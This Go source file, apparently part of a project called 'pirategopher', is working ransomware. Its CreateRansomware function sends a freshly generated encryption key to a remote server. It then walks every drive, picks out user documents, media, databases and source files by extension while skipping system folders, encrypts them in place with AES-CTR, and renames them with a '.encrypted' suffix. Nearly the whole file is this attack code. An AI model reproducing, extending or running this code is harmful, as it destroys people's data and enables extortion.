package pirategopher

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"io"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
)

type PirateFile struct {
	os.FileInfo
	Extension 	string
	FullPath	string
}

type FileTracker struct {
	Files chan *PirateFile
	sync.WaitGroup
}

var (

	tempDir = os.Getenv("TEMP") + "\\"

	fileTracker = FileTracker{
		Files: make(chan *PirateFile),
	}

	filesToRename struct {
		Files []*PirateFile
		sync.Mutex
	}

	keys struct{
		id string
		encKey string
	}

	numWorkers = runtime.NumCPU()

	SkippedDirs = []string{
		"ProgramData",
		"Windows",
		"bootmgr",
		"$WINDOWS.~BT",
		"Windows.old",
		"Temp",
		"tmp",
		"Program Files",
		"Program Files (x86)",
		"AppData",
		"$Recycle.Bin",
	}

	// Interesting extensions to match files
	InterestingExtensions = []string{
		// Text Files
		"doc", "docx", "msg", "odt", "wpd", "wps", "txt",
		// Data files
		"csv", "pps", "ppt", "pptx",
		// Audio Files
		"aif", "iif", "m3u", "m4a", "mid", "mp3", "mpa", "wav", "wma",
		// Video Files
		"3gp", "3g2", "avi", "flv", "m4v", "mov", "mp4", "mpg", "vob", "wmv",
		// 3D Image files
		"3dm", "3ds", "max", "obj", "blend",
		// Raster Image Files
		"bmp", "gif", "png", "jpeg", "jpg", "psd", "tif", "gif", "ico",
		// Vector Image files
		"ai", "eps", "ps", "svg",
		// Page Layout Files
		"pdf", "indd", "pct", "epub",
		// Spreadsheet Files
		"xls", "xlr", "xlsx",
		// Database Files
		"accdb", "sqlite", "dbf", "mdb", "pdb", "sql", "db",
		// Game Files
		"dem", "gam", "nes", "rom", "sav",
		// Temp Files
		"bkp", "bak", "tmp",
		// Config files
		"cfg", "conf", "ini", "prf",
		// Source files
		"html", "php", "js", "c", "cc", "py", "lua", "go", "java",
	}
)

func CreateRansomware(serverUrl string, pubKey []byte) {

	client := newClient(serverUrl, pubKey)

	id, err := generateRandomHexString(32)
	if err != nil {
		log.Fatal(err)
	}
	encKey, err := generateRandomHexString(32)
	if err != nil {
		log.Fatal(err)
	}
	keys.id = id
	keys.encKey = encKey

	res, err := client.addNewKeyPair(id, encKey)
	if err != nil {
		log.Fatal(err)
	}

	switch res.StatusCode {
	case 200, 204:
		break
	default:
		response := struct {
			Status	int		`json:"status"`
			Message string	`json:"message"`
		}{}
		if err = json.NewDecoder(res.Body).Decode(&response); err != nil {
			log.Println(err)
		}
		log.Printf("%d - %s\n", response.Status, response.Message)
	}

	go func() {
		dirs := getDrives()
		for _, dir := range dirs {
			filepath.Walk(dir, walkDriveToEncrypt)
		}
		close(fileTracker.Files)
	}()
	fileTracker.Add(numWorkers)
	startEncryption(numWorkers)
	fileTracker.Wait()
	renameFiles()
}

func walkDriveToEncrypt(path string, f os.FileInfo, err error) error {
	if f.IsDir() {
		for _, skipDir := range SkippedDirs {
			if strings.Contains(filepath.Base(path), skipDir) {
				return filepath.SkipDir
			}
		}
	} else {
		ext := strings.ToLower(filepath.Ext(path))
		if len(ext) >= 2 && stringInSlice(ext[1:], InterestingExtensions) {
			fileTracker.Files <- &PirateFile{
				FileInfo: f,
				Extension: ext[1:],
				FullPath: path,
			}
		}
	}
	return nil
}

func startEncryption(numWorkers int) {
	for i := 0; i < numWorkers; i++ {
		go encryptFiles()
	}
}

func encryptFiles() {
	for file := range fileTracker.Files {
		tempFile, err := os.OpenFile(tempDir+file.Name(),
			os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
		if err != nil {
			log.Println(err)
			continue
		}
		err = file.encryptFile(keys.encKey, tempFile); if err != nil {
			log.Println(err)
			continue
		}
		err = tempFile.Close(); if err != nil {
			log.Println(err)
		}

		err = file.replaceFile(tempDir + file.Name()); if err != nil {
			log.Println(err)
			continue
		}

		filesToRename.Lock()
		filesToRename.Files = append(filesToRename.Files, file)
		filesToRename.Unlock()
	}
	fileTracker.Done()
}

func renameFiles() {
	var listFilesEncrypted []string

	for _, file := range filesToRename.Files {
		newPath := strings.Replace(file.FullPath, file.Name(),
			base64.StdEncoding.EncodeToString([]byte(file.Name())), -1)
		err := renameFile(file.FullPath, newPath + ".encrypted")
		if err != nil {
			log.Println(err)
			continue
		}
		listFilesEncrypted = append(listFilesEncrypted, file.FullPath)
	}
}

func renameFile(origName, newName string) error {
	srcFile, err := os.Open(origName)
	if err != nil {
		return err
	}

	dstfile, err := os.Create(newName)
	if err != nil {
		return err
	}
	_, err = io.Copy(dstfile, srcFile)
	if err != nil {
		return err
	}

	err = srcFile.Close(); if err != nil {
		log.Println(err)
	}
	err = dstfile.Close(); if err != nil {
		log.Println(err)
	}

	if err = os.Remove(origName); err != nil {
		return err
	}


	return nil
}

func (f *PirateFile) encryptFile(encKey string, dst io.Writer) error {
	// Open the file read only
	inFile, err := os.Open(f.FullPath)
	if err != nil {
		return err
	}

	// Create a 128 bits cipher.Block for AES-256
	block, err := aes.NewCipher([]byte(encKey))
	if err != nil {
		return err
	}

	// The IV needs to be unique, but not secure
	iv := make([]byte, aes.BlockSize)
	if _, err = io.ReadFull(rand.Reader, iv); err != nil {
		return err
	}

	// Get a stream for encrypt/decrypt in counter mode (best performance I guess)
	stream := cipher.NewCTR(block, iv)

	// Write the Initialization Vector (iv) as the first block
	// of the dst writer
	dst.Write(iv)

	// Open a stream to encrypt and write to dst
	writer := &cipher.StreamWriter{S: stream, W: dst}

	// Copy the input file to the dst writer, encrypting as we go.
	if _, err = io.Copy(writer, inFile); err != nil {
		return err
	}

	err = inFile.Close()
	if err != nil {
		log.Println(err)
	}

	return nil
}

func (f *PirateFile) replaceFile(filename string) error {
	// Open the file
	file, err := os.OpenFile(f.FullPath, os.O_WRONLY|os.O_TRUNC, 0600)
	if err != nil {
		return err
	}
	defer file.Close()

	src, err := os.Open(filename)
	if err != nil {
		return err
	}
	defer src.Close()

	// Copy the reader to file
	if _, err = io.Copy(file, src); err != nil {
		return err
	}
	return nil
}

